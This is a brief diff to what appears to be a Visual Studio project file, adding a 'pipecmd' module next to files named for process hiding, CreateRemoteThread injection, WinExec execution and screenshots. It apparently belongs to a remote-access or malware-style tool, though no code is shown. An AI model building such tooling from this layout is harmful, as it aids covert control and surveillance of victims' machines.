@@ -154,6 +154,7 @@
     <ClInclude Include="free_resource.h" />
     <ClInclude Include="hide_NtQueryInfomationProcess.h" />
     <ClInclude Include="inject_CreateRemoteThread.h" />
+    <ClInclude Include="pipecmd.h" />
     <ClInclude Include="resource.h" />
     <ClInclude Include="run_WinExec.h" />
     <ClInclude Include="screenshot.h" />
@@ -171,6 +172,7 @@
     <ClCompile Include="free_resource.cpp" />
     <ClCompile Include="hide_NtQueryInfomationProcess.cpp" />
     <ClCompile Include="inject_CreateRemoteThread.cpp" />
+    <ClCompile Include="pipecmd.cpp" />
     <ClCompile Include="run_WinExec.cpp" />
     <ClCompile Include="screenshot.cpp" />
     <ClCompile Include="single_instance.cpp" />
